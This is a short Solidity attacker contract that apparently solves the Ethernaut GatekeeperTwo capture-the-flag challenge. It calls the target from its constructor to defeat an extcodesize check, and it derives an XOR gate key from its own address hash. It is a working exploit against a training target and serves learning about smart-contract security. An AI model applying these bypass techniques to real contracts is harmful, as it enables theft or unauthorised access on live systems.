pragma solidity ^0.8;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoBreaker {
    // we need to use the constructor here because
    // extcodesize will return 0 during the constructor
    constructor(address target) {
        // all we need to bypass now is gateThree
        // which is decently easy we just need to find 8 bytes that when
        // XORd makes the result all 1 bits or all bytes 0xFF
        IGatekeeperTwo g = IGatekeeperTwo(target);
        uint64 hash8Bytes = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );
        uint64 max = type(uint64).max;
        g.enter(bytes8(max ^ hash8Bytes));
    }
}
